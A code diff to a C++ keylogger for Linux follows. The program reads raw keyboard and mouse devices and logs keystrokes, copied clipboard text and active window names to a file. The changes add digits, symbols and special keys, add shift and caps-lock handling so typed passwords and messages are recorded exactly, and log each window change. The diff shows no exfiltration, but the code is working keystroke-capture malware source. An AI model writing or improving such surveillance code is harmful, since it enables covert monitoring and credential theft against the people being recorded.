@@ -23,7 +23,52 @@ std::map<int, std::string> keyMap = {
     {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"}, {KEY_P, "p"},
     {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
     {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"},
-    {KEY_Y, "y"}, {KEY_Z, "z"}
+    {KEY_Y, "y"}, {KEY_Z, "z"},
+
+    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
+    {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"},
+    {KEY_9, "9"}, {KEY_0, "0"},
+
+    {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
+    {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
+    {KEY_BACKSLASH, "\\"}, {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
+    {KEY_GRAVE, "`"}, {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"},
+
+    {KEY_SPACE, " "}, {KEY_ENTER, "\n"},
+    {KEY_BACKSPACE, "[BACKSPACE]"}, {KEY_TAB, "\t"},
+    {KEY_ESC, "[ESC]"},
+
+    // Function keys
+    {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
+    {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
+    {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"},
+
+    // Control keys
+    {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
+    {KEY_LEFTCTRL, "[CTRL]"}, {KEY_RIGHTCTRL, "[CTRL]"},
+    {KEY_LEFTALT, "[ALT]"}, {KEY_RIGHTALT, "[ALT]"},
+    {KEY_CAPSLOCK, "[CAPSLOCK]"},
+
+    // Arrow keys
+    {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"},
+
+    // Keypad keys
+    {KEY_KP0, "0"}, {KEY_KP1, "1"}, {KEY_KP2, "2"}, {KEY_KP3, "3"},
+    {KEY_KP4, "4"}, {KEY_KP5, "5"}, {KEY_KP6, "6"}, {KEY_KP7, "7"},
+    {KEY_KP8, "8"}, {KEY_KP9, "9"},
+    {KEY_KPDOT, "."}, {KEY_KPSLASH, "/"}, {KEY_KPASTERISK, "*"},
+    {KEY_KPMINUS, "-"}, {KEY_KPPLUS, "+"}, {KEY_KPENTER, "\n"}
+};
+
+std::map<int, std::string> shiftKeyMap = {
+    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"},
+    {KEY_5, "%"}, {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"},
+    {KEY_9, "("}, {KEY_0, ")"},
+
+    {KEY_MINUS, "_"}, {KEY_EQUAL, "+"},
+    {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"},
+    {KEY_BACKSLASH, "|"}, {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""},
+    {KEY_GRAVE, "~"}, {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"},
 };
 
 // Function to get the active window name
@@ -66,7 +111,13 @@ int main() {
     vector<int> keyboard_fds; // To store multiple keyboard file descriptors
     vector<int> mouse_fds;    // To store multiple mouse file descriptors
     bool ctrlPressed = false; // Track CTRL key state
+    bool shiftPressed = false; // Track SHIFT key state
+    bool capsLockActive = false; // Track CAPSLOCK state
+
     string lastClipboardContent = ""; // Track the last logged clipboard content
+    string lastActiveWindow = ""; // Track the last active window
+
+
 
     // Open log file
     ofstream logFile(logFilePath, ios::app);
@@ -102,6 +153,15 @@ int main() {
 
     struct input_event event;
     while (true) {
+        // Log active window changes
+        
+        string currentActiveWindow = getActiveWindowName();
+        if (currentActiveWindow != lastActiveWindow) {
+            lastActiveWindow = currentActiveWindow;
+            cout << endl << "[WINDOW CHANGED]: " << currentActiveWindow << endl << endl;
+            logFile << endl << "[WINDOW CHANGED]: " << currentActiveWindow << endl << endl;
+            logFile.flush();
+        }
         // Process keyboard events from all detected keyboard devices
         for (int keyboard_fd : keyboard_fds) {
             if (read(keyboard_fd, &event, sizeof(event)) > 0) {
@@ -109,34 +169,41 @@ int main() {
                     if (event.value == 1) { // Key press
                         if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                             ctrlPressed = true;
+                        } else if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
+                            shiftPressed = true;
+                        } else if (event.code == KEY_CAPSLOCK) {
+                            capsLockActive = !capsLockActive; // Toggle CAPSLOCK state
                         } else if (ctrlPressed && event.code == KEY_C) { // Detect CTRL+C (copy)
                             string clipboardContent = getClipboardContent();
                             if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
-                                string windowName = getActiveWindowName();
                                 lastClipboardContent = clipboardContent;
-                                cout << "[COPY from " << windowName << "]: " << clipboardContent << endl;
-                                logFile << "[COPY from " << windowName << "]: " << clipboardContent << endl;
+                                cout << "[COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
+                                logFile << "[COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                                 logFile.flush();
                             }
-                        } else if (ctrlPressed && event.code == KEY_V) { // Detect CTRL+V (paste)
-                            string clipboardContent = getClipboardContent();
-                            if (!clipboardContent.empty()) {
-                                string windowName = getActiveWindowName();
-                                cout << "[PASTE in " << windowName << "]: " << clipboardContent << endl;
-                                logFile << "[PASTE in " << windowName << "]: " << clipboardContent << endl;
-                                logFile.flush();
-                            }
-                        } else {
+                        } else {                            
                             auto it = keyMap.find(event.code);
                             if (it != keyMap.end()) {
-                                cout << it->second;  // Output to console
-                                logFile << it->second;
+                                string outputKey = it->second;
+                                if (shiftPressed) {
+                                    if (shiftKeyMap.find(event.code) != shiftKeyMap.end()) {
+                                        outputKey = shiftKeyMap[event.code];
+                                    } else {
+                                        outputKey[0] = toupper(outputKey[0]);
+                                    }
+                                } else if (capsLockActive && isalpha(outputKey[0])) {
+                                    outputKey[0] = toupper(outputKey[0]);
+                                }
+                                cout << outputKey;  // Output to console
+                                logFile << outputKey;
                                 logFile.flush();
                             }
                         }
                     } else if (event.value == 0) { // Key release
                         if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                             ctrlPressed = false;
+                        } else if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
+                            shiftPressed = false;
                         }
                     }
                 }
@@ -150,10 +217,9 @@ int main() {
                     if (event.code == BTN_RIGHT) { // Right-click triggers clipboard check
                         string clipboardContent = getClipboardContent();
                         if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
-                            string windowName = getActiveWindowName();
                             lastClipboardContent = clipboardContent;
-                            cout << "[RIGHT-CLICK COPY from " << windowName << "]: " << clipboardContent << endl;
-                            logFile << "[RIGHT-CLICK COPY from " << windowName << "]: " << clipboardContent << endl;
+                            cout << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
+                            logFile << "[RIGHT-CLICK COPY from " << currentActiveWindow << "]: " << clipboardContent << endl;
                             logFile.flush();
                         }
                     }
@@ -169,6 +235,7 @@ int main() {
 
         usleep(1000); // Prevent CPU overuse
     }
+       
 
     // Close devices
     for (int keyboard_fd : keyboard_fds) {
